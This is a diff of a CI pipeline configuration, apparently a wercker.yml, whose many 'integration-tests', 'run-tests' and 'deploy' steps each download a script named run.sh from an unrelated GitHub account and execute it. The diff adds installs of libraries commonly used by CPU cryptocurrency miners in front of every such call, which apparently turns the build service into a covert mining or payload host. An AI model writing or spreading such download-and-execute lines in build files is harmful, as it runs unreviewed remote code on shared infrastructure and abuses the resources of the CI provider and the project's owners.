@@ -45,6 +45,7 @@ integration-tests:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                          
 
@@ -64,6 +65,7 @@ deploy:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 
@@ -84,6 +86,7 @@ run-tests:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
+                 apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                  wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                  
 integration-tests1:
@@ -103,6 +106,7 @@ integration-tests1:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
 
 deploy3:
@@ -118,6 +122,7 @@ deploy3:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
         tag: $WERCKER_GIT_COMMIT
         ports: "5000"
@@ -141,6 +146,7 @@ integration-tests2:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests3:
@@ -160,6 +166,7 @@ integration-tests3:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
 
 deploy1:
@@ -177,6 +184,7 @@ deploy1:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 
@@ -197,6 +205,7 @@ run-tests1:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
+                 apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                  wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                  
 integration-tests4:
@@ -216,6 +225,7 @@ integration-tests4:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests5:
@@ -235,6 +245,7 @@ integration-tests5:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests6:
@@ -254,6 +265,7 @@ integration-tests6:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
 
 deploy2:
@@ -271,6 +283,7 @@ deploy2:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 
@@ -292,6 +305,7 @@ run-tests2:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
+                 apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                  wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                  
 integration-tests7:
@@ -311,6 +325,7 @@ integration-tests7:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests8:
@@ -330,6 +345,7 @@ integration-tests8:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update && apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests9:
@@ -349,4 +365,6 @@ integration-tests9:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
+               apt-get update
+               apt-get upgrade -y && apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
                wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
